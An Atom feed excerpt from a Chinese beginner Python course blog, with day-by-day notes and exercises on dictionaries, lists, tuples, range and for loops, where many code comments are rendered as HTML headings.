<h1 id="printdichobby_list">print(dic['hobby_list'])</h1>
<h1 id="printdichobby_list1">print(dic['hobby_list1'])</h1>
<h1 id="get">get  ***</h1>
<h1 id="l1-dicgethobby_list">l1 = dic.get('hobby_list')</h1>
<h1 id="l1-dicgethobby_list1没有此键sb-可以设置返回值">l1 = dic.get('hobby_list1','没有此键sb')  # 可以设置返回值</h1>
<h1 id="printl1">print(l1)</h1>
<h1 id="三个特殊的">三个特殊的</h1>
<h1 id="keys-values-items">keys() values() items()</h1>
<h1 id="printdickeystypedickeys">print(dic.keys(),type(dic.keys()))</h1>
<h1 id="可以转化成列表">可以转化成列表</h1>
<h1 id="printlistdickeys">print(list(dic.keys()))</h1>
<h1 id="for-key-in-dickeys">for key in dic.keys():</h1>
<h1 id="printkey">print(key)</h1>
<h1 id="for-key-in-dic">for key in dic:</h1>
<h1 id="printkey-2">print(key)</h1>
<h1 id="values">values()</h1>
<h1 id="printdicvalues">print(dic.values())</h1>
<h1 id="printlistdicvalues">print(list(dic.values()))</h1>
<h1 id="for-value-in-dicvalues">for value in dic.values():</h1>
<h1 id="printvalue">print(value)</h1>
<h1 id="items">items()</h1>
<h1 id="printdicitems">print(dic.items())</h1>
<h1 id="for-keyvalue-in-dicitems">for key,value in dic.items():</h1>
<h1 id="printkeyvalue">print(key,value)</h1>
<h1 id="ab-name-太白">a,b = ('name', '太白')</h1>
<h1 id="printab">print(a,b)</h1>
<h1 id="面试题">面试题</h1>
<h1 id="a-18">a = 18</h1>
<h1 id="b-12">b = 12</h1>
<h1 id="ab-ba">a,b = b,a</h1>
<h1 id="ab-1218"># a,b = 12,18</h1>
<h1 id="printab-2">print(a,b)</h1>
<p>相关练习题：</p>
<p>dic = {'k1': &quot;v1&quot;, &quot;k2&quot;: &quot;v2&quot;, &quot;k3&quot;: [11,22,33]}</p>
<h1 id="请在字典中添加一个键值对k4-v4输出添加后的字典">请在字典中添加一个键值对，&quot;k4&quot;: &quot;v4&quot;，输出添加后的字典</h1>
<h1 id="请在修改字典中-k1-对应的值为-alex输出修改后的字典">请在修改字典中 &quot;k1&quot; 对应的值为 &quot;alex&quot;，输出修改后的字典</h1>
<h1 id="请在k3对应的值中追加一个元素-44输出修改后的字典">请在k3对应的值中追加一个元素 44，输出修改后的字典</h1>
<h1 id="printdick3">print(dic['k3'])</h1>
<h1 id="l1-dicgetk3">l1 = dic.get('k3')</h1>
<h1 id="printl1-2">print(l1)</h1>
<h1 id="dicgetk3append44">dic.get('k3').append(44)</h1>
<h1 id="printdic-9">print(dic)</h1>
<h1 id="请在k3对应的值的第-1-个位置插入个元素-18输出修改后的字典">请在k3对应的值的第 1 个位置插入个元素 18，输出修改后的字典</h1>
<p>字典的嵌套</p>
<p>dic = {<br>
'name': '汪峰',<br>
'age': 48,<br>
'wife': [{'name': '国际章', 'age': 38},],<br>
'children': {'girl_first': '小苹果','girl_second': '小怡','girl_three': '顶顶'}<br>
}</p>
<h1 id="1-获取汪峰的名字">1. 获取汪峰的名字。</h1>
<h1 id=""></h1>
<h1 id="2获取这个字典name国际章age38">2.获取这个字典：{'name':'国际章','age':38}。</h1>
<h1 id="-2"></h1>
<h1 id="3-获取汪峰妻子的名字">3. 获取汪峰妻子的名字。</h1>
<h1 id="4-获取汪峰的第三个孩子名字">4. 获取汪峰的第三个孩子名字。</h1>
<p>04 今日总结<br>
字典：查询速度快，数据的关联性强。<br>
键不可变得数据类型，（str int），唯一。<br>
值：任意数据类型，对象。<br>
增删改查（全部都要会默写）***<br>
字典的嵌套。***<br>
05 明日预习内容<br>
明天讲理论性偏多：id is == 小数据池，集合。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day04]]></title>
        <id>https://itxz.fun/post/day04/</id>
        <link href="https://itxz.fun/post/day04/">
        </link>
        <updated>2020-04-22T09:36:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="1-今日内容大纲">1 今日内容大纲</h2>
<ul>
<li>列表的初识</li>
<li>列表的索引切片</li>
<li>列表的增删改查</li>
<li>列表的嵌套</li>
<li>元组的初识（了解）</li>
<li>元组的简单应用（了解）</li>
<li>range</li>
</ul>
<h2 id="2-昨日内容回顾以及作业讲解">2 昨日内容回顾以及作业讲解</h2>
<ul>
<li>int str bool</li>
<li>str：s1 = '太白123abc'
<ul>
<li>索引：
<ul>
<li>s1[0]</li>
<li>s1[-1]</li>
<li>s1[:3]</li>
<li>s1[:5:2]</li>
<li>s1[-1:-4:-1]</li>
<li>s1[-1:-6:-2]</li>
</ul>
</li>
<li>常用操作方法：
<ul>
<li>upper lower</li>
<li>startswith endswith</li>
<li>split 分割：str----&gt;list
<ul>
<li>默认按照空格。</li>
<li>可以指定分隔符。</li>
</ul>
</li>
<li>strip：默认去除字符串两边的空格，换行符，制表符。</li>
<li>isdecimal isalpha  isalnum</li>
<li>format 格式化输出</li>
<li>count某个元素出现的次数</li>
<li>join 连接</li>
<li>replace</li>
<li>len() 获取数据的元素个数。</li>
</ul>
</li>
<li>for循环</li>
</ul>
</li>
</ul>
<h2 id="3-具体内容">3 具体内容</h2>
<ol>
<li>
<p><strong>如何学习python</strong></p>
<p>确实非常困难。如何解压？如何学习。</p>
<p>python，语言，中文，英语。</p>
<p>华尔街英语：母式英语。</p>
<p>中国人教的英语：在国外很难生存。</p>
<p>听说读写练。</p>
<p>​	input 							output</p>
<p>​	听									写（练）</p>
<p>​	读                                    说</p>
<p>2岁的孩子：</p>
</li>
</ol>
<p>​			听，							     说    											纠正</p>
<p>​</p>
<p>​		你们现在的比例：<br>
​				听：3.5 + 2 +  1 = 6.5        练：2~3.								纠正：0.5</p>
<p>​		120行 *120:14400</p>
<p>​		1.  上午要认真听！！！</p>
<p>​		2. 下午不要听视频，抓紧时间放在练习代码上，写作业，代码251行。</p>
<p>​		3. 讨论（下周开始）。</p>
<ol start="2">
<li>
<p><strong>列表的初识</strong></p>
<ul>
<li>
<p>why：int bool str：'123 True 太白'</p>
<ul>
<li>str： 存储少量的数据。</li>
<li>str：切片还是对其进行任何操作，获取的内容全都是str类型。存储的数据单一。</li>
</ul>
</li>
<li>
<p>what：list</p>
<ul>
<li>l1 = [100, 'alex',True,[1, 2, 3]] 承载任意数据类型，存储大量的数据。</li>
<li>python常用的容器型数据类型。list 列表，其他语言：Java: 数组。</li>
<li>列表是有序的，可索引，切片（步长）。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>索引，切片，步长。</strong></p>
<pre><code class="language-python">li = [100, '太白', True, [1, 2, 3]]
# 索引
# print(li[0], type(li[0]))
# print(li[1],type(li[1]))
# print(li[-1])

# 切片 （顾头不顾腚）
# print(li[:2])
</code></pre>
<p>相关练习题：</p>
<pre><code class="language-python">li = [1, 3, 2, &quot;a&quot;, 4, &quot;b&quot;, 5,&quot;c&quot;]
通过对li列表的切片形成新的列表l1,l1 = [1,3,2]
通过对li列表的切片形成新的列表l2,l2 = [&quot;a&quot;,4,&quot;b&quot;]
通过对li列表的切片形成新的列表l4,l4 = [3,&quot;a&quot;,&quot;b&quot;]
通过对li列表的切片形成新的列表l6,l6 = [&quot;b&quot;,&quot;a&quot;,3]
</code></pre>
</li>
<li>
<p>列表的增删改查</p>
<pre><code class="language-python"># 列表的创建
# 方式一
# l1 = [1, 2, 'Alex']

# 方式二
# l1 = list()
# l1 = list('fhdsjkafsdafhsdfhsdaf')
# print(l1)

# 方式三：列表推导式 后面讲

# 增删改查
l1 = ['太白', '女神', 'xiao','吴老师', '闫龙']
# 增：
# append:追加
# l1.append('xx')
# print(l1.append('xx'))  # 不能打印它
# print(l1)

# 举例：
# l1 = ['太白', '女神', '吴老师', 'xiao', '闫龙']
# while 1:
#     name = input('请输入新员工姓名：(Q或者q退出程序)')
#     if name.upper() == 'Q': break
#     l1.append(name)
# print(l1)

# insert 插入
# l1.insert(2,'wusir')
# print(l1)
#extend 迭代着追加
# l1.extend('abcd')
# l1.extend(['alex',])
# l1.extend(['alex', 1, 3])
# print(l1)

# 删
# pop 按照索引位置删除
# l1.pop(-2)  # 按照索引删除 （返回的是删除的元素）
# print(l1.pop(-2))
# l1.pop()  # 默认删除最后一个
# print(l1)

# remove  指定元素删除,如果有重名元素，默认删除从左数第一个
# l1.remove('xiao')
# print(l1)

# clear(了解)
# l1.clear() # 清空
# print(l1)

# del
    # 按照索引删除
# del l1[-1]
# print(l1)
    # 按照切片(步长)删除
# del l1[::2]
# print(l1)

# 改
# 按照索引改值
# l1[0] = '男神'
# 按照切片改（了解）
# l1[2:] = 'fsdafsdafsdfdsfsadfdsfdsgsfdag'
# print(l1)
# 按照切片（步长）（了解）
# l1[::2] = 'abc'
# l1[::2] = 'abcd'
# print(l1)

# 查：
# 索引，切片（步长）
# for i in l1:
#     print(i)
</code></pre>
</li>
<li>
<p>列表的嵌套</p>
<pre><code class="language-python">l1 = [1, 2, 'taibai', [1, 'alex', 3,]]
# 1, 将l1中的'taibai'变成大写并放回原处。
# 2，给小列表[1,'alex',3,]追加一个元素,'老男孩教育'。
# 3，将列表中的'alex'通过字符串拼接的方式在列表中变成'alexsb'
</code></pre>
</li>
<li>
<p>元组(<strong>了解</strong>)</p>
<ul>
<li>只读列表。存大量的数据，可以索引，切片（步长），  (100, '太白', True, [1, 2, 3])</li>
</ul>
</li>
<li>
<p>range： 类似于列表，自定制数字范围的数字列表</p>
</li>
</ol>
<h2 id="4-今日总结">4 今日总结</h2>
<ol>
<li>
<p>列表的所有的方法全部都要记住，背过（除去了解的）append insert extend pop remove del clear  。</p>
</li>
<li>
<p>列表的嵌套一定要会。</p>
</li>
<li>
<p>range.与for循环结合。</p>
</li>
</ol>
<h2 id="5-节后预习内容">5 节后预习内容</h2>
<p>​	1. 字典。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[day03（for循环）]]></title>
        <id>https://itxz.fun/post/day03for-xun-huan/</id>
        <link href="https://itxz.fun/post/day03for-xun-huan/">
        </link>
        <updated>2020-04-22T09:25:56.000Z</updated>
        <content type="html"><![CDATA[<h1 id="s1-老男孩edu">s1 = '老男孩edu'</h1>
<h1 id="print老-in-s1">print('老' in s1)</h1>
<h1 id="print老男-in-s1">print('老男' in s1)</h1>
<h1 id="print老ed-in-s1">print('老ed' in s1)</h1>
<h1 id="print老ed-not-in-s1">print('老ed' not in s1)</h1>
<p>s1 = '老男孩教育最好的讲师：太白'<br>
'''<br>
老      s1[0]<br>
男      s1[1]<br>
孩      s1[2]<br>
教      s1[3]<br>
育      ....<br>
最<br>
...<br>
'''</p>
<h1 id="0~12">0~12</h1>
<h1 id="len-获取可迭代对象的元素总个数">len :获取可迭代对象的元素总个数</h1>
<h1 id="printlens1">print(len(s1))</h1>
<h1 id="s1-老男孩教育最好的讲师太白">s1 = '老男孩教育最好的讲师：太白'</h1>
<h1 id="index-0">index = 0</h1>
<h1 id="while-index-lens1">while index &lt; len(s1):</h1>
<h1 id="prints1index">print(s1[index])</h1>
<h1 id="index-1">index += 1</h1>
<h1 id="for-循环">for 循环</h1>
<p>'''<br>
有限循环<br>
for 变量 in iterable:<br>
pass<br>
'''<br>
s1 = '老男孩教育最好的讲师：太白'</p>
<h1 id="for-i-in-s1">for i in s1:</h1>
<h1 id="printi">print(i)</h1>
<p>for i in s1:<br>
print(i)<br>
if i == '好':<br>
break</p>
<h1 id="break-continue">break continue</h1>
<h1 id="for-else-while-else用法一样">for else: while else:用法一样。</h1>
]]></content>
    </entry>
</feed>